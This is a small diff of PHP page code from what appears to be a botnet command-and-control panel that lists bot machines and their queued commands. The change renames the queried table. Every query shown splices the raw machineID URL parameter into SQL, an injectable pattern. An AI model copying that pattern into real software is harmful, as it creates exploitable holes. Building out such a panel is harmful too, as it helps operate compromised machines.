@@ -36,7 +36,7 @@ if (!isset($_GET['machineID']) || (isset($_GET['machineID']) && $_GET['machineID
 			</thead>
 			<tbody>
 				<?php
-				$sql = "SELECT * FROM botnet WHERE machineID='" . $_GET['machineID'] . "'";
+				$sql = "SELECT * FROM command WHERE machineID='" . $_GET['machineID'] . "'";
 				$result = mysqli_query($conn, $sql);
 				while ($row = $result->fetch_assoc()) {
 					if ($row['system'] == "WINDOWS")
@@ -93,7 +93,7 @@ if (!isset($_GET['machineID']) || (isset($_GET['machineID']) && $_GET['machineID
 	</div>
 
 	<?php
-	$sql = "SELECT * FROM botnet WHERE machineID='" . $_GET['machineID'] . "'";
+	$sql = "SELECT * FROM command WHERE machineID='" . $_GET['machineID'] . "'";
 	$result = mysqli_query($conn, $sql);
 	while ($row = $result->fetch_assoc()) {
 		echo '<div id="commandsTab" class="commands demo-card-wide mdl-card mdl-shadow--2dp" style="display:none;">
